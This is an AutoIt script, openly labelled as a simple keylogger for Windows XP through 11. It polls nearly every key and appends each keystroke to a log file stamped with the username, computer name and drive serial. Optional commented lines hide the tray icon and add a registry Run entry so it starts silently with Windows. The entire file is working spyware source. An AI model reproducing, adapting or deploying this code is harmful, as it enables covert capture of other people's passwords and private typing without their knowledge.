#cs ----------------------------------------------------------------------------

 AutoIt Version: 3.3.14.5
 Author:         Sotiris Liagkas

 Script Function:
	A simple keylogger for Microsoft Windows XP/Vista/7/8/10/11

#ce ----------------------------------------------------------------------------

; Script Start - Add your code below here

#include <Misc.au3>
#include <string.au3>
#include <File.au3>

; Uncomment the next line to hide the tray icon
;#NoTrayIcon

; Uncomment the next line to auto start with Windows
;RegWrite("HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run", "Standard Keylogging Process", "REG_SZ", @ScriptFullPath)

Dim $Sep     = "######################################################################################################"
Dim $comment = "######################################################################################################"
Dim $name = DriveGetSerial(@HomeDrive)
Dim $file = @ScriptDir & "\[" & $name & "][" & @MDAY & "." & @MON & "." & @YEAR & "].log"
Dim $string
Dim $today

If @WDAY = 1 Then $today = "Sunday"
If @WDAY = 2 Then $today = "Monday"
If @WDAY = 3 Then $today = "Tuesday"
If @WDAY = 4 Then $today = "Wednesday"
If @WDAY = 5 Then $today = "Thursday"
If @WDAY = 6 Then $today = "Friday"
If @WDAY = 7 Then $today = "Saturday"

If FileExists(@ScriptDir & "\[" & $name & "][" & @MDAY & "." & @MON & "." & @YEAR & "].log") Then FileWrite($file,@CRLF & @CRLF)
FileWrite($file, $Sep & @CRLF & "######################################################################################################" & @CRLF & $comment & @CRLF & "USERNAME: " & @UserName & ", DOMAIN: " & @ComputerName & ", [Started at " & $today & " " & @MDAY & "/" & @MON & "/" & @YEAR & ", " & @HOUR & ":" & @MIN & ":" & @SEC & "]" & @CRLF & $Sep & @CRLF & @CRLF)

While True

	sleep(16)

	If _IsPressed("23") Then
		$string = "{END}"

        FileWrite($file,$string)
		Do
		Until Not _IsPressed("23")
    EndIf
	If _IsPressed("08") Then
		$string = "{BACKSPACE}"

        FileWrite($file,$string)
				Do
		Until Not _IsPressed("08")
    EndIf
	If _IsPressed("09") Then
		$string = "{TAB}"

        FileWrite($file,$string)
				Do
		Until Not _IsPressed("09")
    EndIf
	If _IsPressed("0C") Then
		$string = "{CLEAR}"

        FileWrite($file,$string)
				Do
		Until Not _IsPressed("0C")
    EndIf
	If _IsPressed("0D") Then
		$string = "{ENTER}"

        FileWrite($file,$string & @CRLF)
				Do
		Until Not _IsPressed("0D")
    EndIf
	If _IsPressed("10") Then
		$string = "{SHIFT}"

        FileWrite($file,$string)
		_ReplaceStringInFile($file, "{SHIFT}{SHIFT}", "{SHIFT}")
    EndIf
	If _IsPressed("11") Then
		$string = "{CTRL}"

        FileWrite($file,$string)
		_ReplaceStringInFile($file, "{CTRL}{CTRL}", "{CTRL}")
    EndIf
	If _IsPressed("12") Then
		$string = "{ALT}"

        FileWrite($file,$string)
		_ReplaceStringInFile($file, "{ALT}{ALT}", "{ALT}")
    EndIf
	If _IsPressed("13") Then
		$string = "{PAUSE}"

        FileWrite($file,$string)
				Do
		Until Not _IsPressed("13")
    EndIf
	If _IsPressed("14") Then
		$string = "{CAPS LOCK}"

        FileWrite($file,$string)
				Do
		Until Not _IsPressed("14")
    EndIf
	If _IsPressed("1B") Then
		$string = "{ESC}"

        FileWrite($file,$string)
				Do
		Until Not _IsPressed("1B")
    EndIf
	If _IsPressed("20") Then
		$string = " "

        FileWrite($file,$string)
				Do
		Until Not _IsPressed("20")
    EndIf
	If _IsPressed("21") Then
		$string = "{PAGE UP}"

        FileWrite($file,$string)
				Do
		Until Not _IsPressed("21")
    EndIf
	If _IsPressed("22") Then
		$string = "{PAGE DOWN}"

        FileWrite($file,$string)
				Do
		Until Not _IsPressed("22")
    EndIf
	If _IsPressed("24") Then
		$string = "{HOME}"

        FileWrite($file,$string)
				Do
		Until Not _IsPressed("24")
    EndIf
	If _IsPressed("25") Then
		$string = "{LEFT ARROW}"

        FileWrite($file,$string)
				Do
		Until Not _IsPressed("25")
    EndIf
	If _IsPressed("26") Then
		$string = "{UP ARROW}"

        FileWrite($file,$string)
				Do
		Until Not _IsPressed("26")
    EndIf
	If _IsPressed("27") Then
		$string = "{RIGHT ARROW}"

        FileWrite($file,$string)
				Do
		Until Not _IsPressed("27")
    EndIf
	If _IsPressed("28") Then
		$string = "{DOWN ARROW}"

        FileWrite($file,$string)
				Do
		Until Not _IsPressed("28")
    EndIf
	If _IsPressed("29") Then
		$string = "{SELECT}"

        FileWrite($file,$string)
				Do
		Until Not _IsPressed("29")
    EndIf
	If _IsPressed("2A") Then
		$string = "{PRINT}"

        FileWrite($file,$string)
				Do
		Until Not _IsPressed("2A")
    EndIf
	If _IsPressed("2B") Then
		$string = "{EXECUTE}"

        FileWrite($file,$string)
				Do
		Until Not _IsPressed("2B")
    EndIf
	If _IsPressed("2C") Then
		$string = "{PRINT}"

        FileWrite($file,$string)
				Do
		Until Not _IsPressed("2C")
    EndIf
	If _IsPressed("2D") Then
		$string = "{INS}"

        FileWrite($file,$string)
				Do
		Until Not _IsPressed("2D")
    EndIf
	If _IsPressed("2E") Then
		$string = "{DEL}"

        FileWrite($file,$string)
		_ReplaceStringInFile($file, "{DEL}{DEL}", "{DEL}")
				Do
		Until Not _IsPressed("2E")
    EndIf
	If _IsPressed("30") Then
		$string = "0"

        FileWrite($file,$string)
		_ReplaceStringInFile($file, "{DEL}{DEL}", "{DEL}")
				Do
		Until Not _IsPressed("30")
    EndIf
	If _IsPressed("31") Then
		$string = "1"

        FileWrite($file,$string)
		_ReplaceStringInFile($file, "{DEL}{DEL}", "{DEL}")
				Do
		Until Not _IsPressed("31")
    EndIf
	If _IsPressed("32") Then
		$string = "2"

        FileWrite($file,$string)
				Do
		Until Not _IsPressed("32")
    EndIf
	If _IsPressed("33") Then
		$string = "3"

        FileWrite($file,$string)
				Do
		Until Not _IsPressed("33")
    EndIf
	If _IsPressed("34") Then
		$string = "4"

        FileWrite($file,$string)
				Do
		Until Not _IsPressed("34")
    EndIf
	If _IsPressed("35") Then
		$string = "5"

        FileWrite($file,$string)
				Do
		Until Not _IsPressed("35")
    EndIf
	If _IsPressed("36") Then
		$string = "6"

        FileWrite($file,$string)
				Do
		Until Not _IsPressed("36")
    EndIf
	If _IsPressed("37") Then
		$string = "7"

        FileWrite($file,$string)
				Do
		Until Not _IsPressed("37")
    EndIf
	If _IsPressed("38") Then
		$string = "8"

        FileWrite($file,$string)
				Do
		Until Not _IsPressed("38")
    EndIf
	If _IsPressed("39") Then
		$string = "9"

        FileWrite($file,$string)
				Do
		Until Not _IsPressed("39")
    EndIf
	If _IsPressed("41") Then
		$string = "a"

        FileWrite($file,$string)
				Do
		Until Not _IsPressed("41")
    EndIf
	If _IsPressed("42") Then
		$string = "b"

        FileWrite($file,$string)
				Do
		Until Not _IsPressed("42")
    EndIf
	If _IsPressed("43") Then
		$string = "c"

        FileWrite($file,$string)
				Do
		Until Not _IsPressed("43")
    EndIf
	If _IsPressed("44") Then
		$string = "d"

        FileWrite($file,$string)
				Do
		Until Not _IsPressed("44")
    EndIf
	If _IsPressed("45") Then
		$string = "e"

        FileWrite($file,$string)
				Do
		Until Not _IsPressed("45")
    EndIf
	If _IsPressed("46") Then
		$string = "f"

        FileWrite($file,$string)
				Do
		Until Not _IsPressed("46")
    EndIf
	If _IsPressed("47") Then
		$string = "g"

        FileWrite($file,$string)
				Do
		Until Not _IsPressed("47")
    EndIf
	If _IsPressed("48") Then
		$string = "h"

        FileWrite($file,$string)
				Do
		Until Not _IsPressed("48")
    EndIf
	If _IsPressed("49") Then
		$string = "i"

        FileWrite($file,$string)
				Do
		Until Not _IsPressed("49")
    EndIf
	If _IsPressed("4A") Then
		$string = "j"

        FileWrite($file,$string)
				Do
		Until Not _IsPressed("4A")
    EndIf
	If _IsPressed("4B") Then
		$string = "k"

        FileWrite($file,$string)
				Do
		Until Not _IsPressed("4B")
    EndIf
	If _IsPressed("4C") Then
		$string = "l"

        FileWrite($file,$string)
				Do
		Until Not _IsPressed("4C")
    EndIf
	If _IsPressed("4D") Then
		$string = "m"

        FileWrite($file,$string)
				Do
		Until Not _IsPressed("4D")
    EndIf
	If _IsPressed("4E") Then
		$string = "n"

        FileWrite($file,$string)
				Do
		Until Not _IsPressed("4E")
    EndIf
	If _IsPressed("4F") Then
		$string = "o"

        FileWrite($file,$string)
				Do
		Until Not _IsPressed("4F")
    EndIf
	If _IsPressed("50") Then
		$string = "p"

        FileWrite($file,$string)
				Do
		Until Not _IsPressed("50")
    EndIf
	If _IsPressed("51") Then
		$string = "q"

        FileWrite($file,$string)
				Do
		Until Not _IsPressed("51")
    EndIf
	If _IsPressed("52") Then
		$string = "r"

        FileWrite($file,$string)
				Do
		Until Not _IsPressed("52")
    EndIf
	If _IsPressed("53") Then
		$string = "s"

        FileWrite($file,$string)
				Do
		Until Not _IsPressed("53")
    EndIf
	If _IsPressed("54") Then
		$string = "t"

        FileWrite($file,$string)
				Do
		Until Not _IsPressed("54")
    EndIf
	If _IsPressed("55") Then
		$string = "u"

        FileWrite($file,$string)
				Do
		Until Not _IsPressed("55")
    EndIf
	If _IsPressed("56") Then
		$string = "v"

        FileWrite($file,$string)
				Do
		Until Not _IsPressed("56")
    EndIf
	If _IsPressed("57") Then
		$string = "w"

        FileWrite($file,$string)
				Do
		Until Not _IsPressed("57")
    EndIf
	If _IsPressed("58") Then
		$string = "x"

        FileWrite($file,$string)
				Do
		Until Not _IsPressed("58")
    EndIf
	If _IsPressed("59") Then
		$string = "y"

        FileWrite($file,$string)
				Do
		Until Not _IsPressed("59")
    EndIf
	If _IsPressed("5A") Then
		$string = "z"

        FileWrite($file,$string)
				Do
		Until Not _IsPressed("5A")
    EndIf
	If _IsPressed("5B") Then
		$string = "{LEFT WINDOWS KEY}"

        FileWrite($file,$string)
				Do
		Until Not _IsPressed("5B")
    EndIf
	If _IsPressed("5C") Then
		$string = "{RIGHT WINDOWS KEY}"

        FileWrite($file,$string)
				Do
		Until Not _IsPressed("5C")
    EndIf
	If _IsPressed("60") Then
		$string = "{NUM KEYPAD 0}"

        FileWrite($file,$string)
				Do
		Until Not _IsPressed("60")
    EndIf
	If _IsPressed("61") Then
		$string = "{NUM KEYPAD 1}"

        FileWrite($file,$string)
				Do
		Until Not _IsPressed("61")
    EndIf
	If _IsPressed("62") Then
		$string = "{NUM KEYPAD 2}"

        FileWrite($file,$string)
				Do
		Until Not _IsPressed("62")
    EndIf
	If _IsPressed("63") Then
		$string = "{NUM KEYPAD 3}"

        FileWrite($file,$string)
				Do
		Until Not _IsPressed("63")
    EndIf
	If _IsPressed("64") Then
		$string = "{NUM KEYPAD 4}"

        FileWrite($file,$string)
				Do
		Until Not _IsPressed("64")
    EndIf
	If _IsPressed("65") Then
		$string = "{NUM KEYPAD 5}"

        FileWrite($file,$string)
				Do
		Until Not _IsPressed("65")
    EndIf
	If _IsPressed("66") Then
		$string = "{NUM KEYPAD 6}"

        FileWrite($file,$string)
				Do
		Until Not _IsPressed("66")
    EndIf
	If _IsPressed("67") Then
		$string = "{NUM KEYPAD 7}"

        FileWrite($file,$string)
				Do
		Until Not _IsPressed("67")
    EndIf
	If _IsPressed("68") Then
		$string = "{NUM KEYPAD 8}"

        FileWrite($file,$string)
				Do
		Until Not _IsPressed("68")
    EndIf
	If _IsPressed("69") Then
		$string = "{NUM KEYPAD 9}"

        FileWrite($file,$string)
				Do
		Until Not _IsPressed("69")
    EndIf
	If _IsPressed("6A") Then
		$string = "{MULTIPLAY}"

        FileWrite($file,$string)
				Do
		Until Not _IsPressed("6A")
    EndIf
	If _IsPressed("6B") Then
		$string = "{ADD}"

        FileWrite($file,$string)
				Do
		Until Not _IsPressed("6B")
    EndIf
	If _IsPressed("6C") Then
		$string = "{SEPARATOR}"

        FileWrite($file,$string)
				Do
		Until Not _IsPressed("6C")
    EndIf
	If _IsPressed("6D") Then
		$string = "{SUBTRACT}"

        FileWrite($file,$string)
				Do
		Until Not _IsPressed("6D")
    EndIf
	If _IsPressed("6E") Then
		$string = "{DEMICAL}"

        FileWrite($file,$string)
				Do
		Until Not _IsPressed("6E")
    EndIf
	If _IsPressed("6F") Then
		$string = "{DIVIDE}"

        FileWrite($file,$string)
				Do
		Until Not _IsPressed("6F")
    EndIf
	If _IsPressed("70") Then
		$string = "{F1}"

        FileWrite($file,$string)
				Do
		Until Not _IsPressed("70")
    EndIf
	If _IsPressed("71") Then
		$string = "{F2}"

        FileWrite($file,$string)
				Do
		Until Not _IsPressed("71")
    EndIf
	If _IsPressed("73") Then
		$string = "{F4}"

        FileWrite($file,$string)
				Do
		Until Not _IsPressed("73")
    EndIf
	If _IsPressed("72") Then
		$string = "{F3}"

        FileWrite($file,$string)
				Do
		Until Not _IsPressed("72")
    EndIf
	If _IsPressed("74") Then
		$string = "{F5}"

        FileWrite($file,$string)
				Do
		Until Not _IsPressed("74")
    EndIf
	If _IsPressed("75") Then
		$string = "{F6}"

        FileWrite($file,$string)
				Do
		Until Not _IsPressed("75")
    EndIf
	If _IsPressed("76") Then
		$string = "{F7}"

        FileWrite($file,$string)
				Do
		Until Not _IsPressed("76")
    EndIf
	If _IsPressed("77") Then
		$string = "{F8}"

        FileWrite($file,$string)
				Do
		Until Not _IsPressed("77")
    EndIf
	If _IsPressed("78") Then
		$string = "{F9}"

        FileWrite($file,$string)
				Do
		Until Not _IsPressed("78")
    EndIf
	If _IsPressed("79") Then
		$string = "{F10}"

        FileWrite($file,$string)
				Do
		Until Not _IsPressed("79")
    EndIf
	If _IsPressed("7A") Then
		$string = "{F11}"

        FileWrite($file,$string)
				Do
		Until Not _IsPressed("7A")
    EndIf
	If _IsPressed("7B") Then
		$string = "{F12}"

        FileWrite($file,$string)
				Do
		Until Not _IsPressed("7B")
    EndIf
	If _IsPressed("7C") Then
		$string = "{F13}"

        FileWrite($file,$string)
				Do
		Until Not _IsPressed("7C")
    EndIf
	If _IsPressed("7D") Then
		$string = "{F14}"

        FileWrite($file,$string)
				Do
		Until Not _IsPressed("7D")
    EndIf
	If _IsPressed("7E") Then
		$string = "{F15}"

        FileWrite($file,$string)
				Do
		Until Not _IsPressed("7E")
    EndIf
	If _IsPressed("7F") Then
		$string = "{F16}"

        FileWrite($file,$string)
				Do
		Until Not _IsPressed("7F")
    EndIf
	If _IsPressed("90") Then
		$string = "{NUM LOCK}"

        FileWrite($file,$string)
				Do
		Until Not _IsPressed("90")
    EndIf
	If _IsPressed("91") Then
		$string = "{SCROLL LOCK}"

        FileWrite($file,$string)
				Do
		Until Not _IsPressed("91")
    EndIf
	If _IsPressed("BA") Then
		$string = ";"

        FileWrite($file,$string)
		Do
		Until Not _IsPressed("BA")
    EndIf
	If _IsPressed("BB") Then
		$string = "="

        FileWrite($file,$string)
		Do
		Until Not _IsPressed("BB")
    EndIf
	If _IsPressed("BC") Then
		$string = ","

        FileWrite($file,$string)
		Do
		Until Not _IsPressed("BC")
    EndIf
	If _IsPressed("BD") Then
		$string = "-"

        FileWrite($file,$string)
		Do
		Until Not _IsPressed("BD")
    EndIf
	If _IsPressed("BE") Then
		$string = "."

        FileWrite($file,$string)
		Do
		Until Not _IsPressed("BE")
    EndIf
	If _IsPressed("BF") Then
		$string = "/"

        FileWrite($file,$string)
		Do
		Until Not _IsPressed("BF")
    EndIf
	If _IsPressed("C0") Then
		$string = "`"

        FileWrite($file,$string)
		Do
		Until Not _IsPressed("C0")
    EndIf
	If _IsPressed("DB") Then
		$string = "["

        FileWrite($file,$string)
		Do
		Until Not _IsPressed("DB")
    EndIf
	If _IsPressed("DC") Then
		$string = "\"

        FileWrite($file,$string)
		Do
		Until Not _IsPressed("DC")
    EndIf
	If _IsPressed("DD") Then
		$string = "]"

        FileWrite($file,$string)
		Do
		Until Not _IsPressed("DD")
    EndIf

WEnd
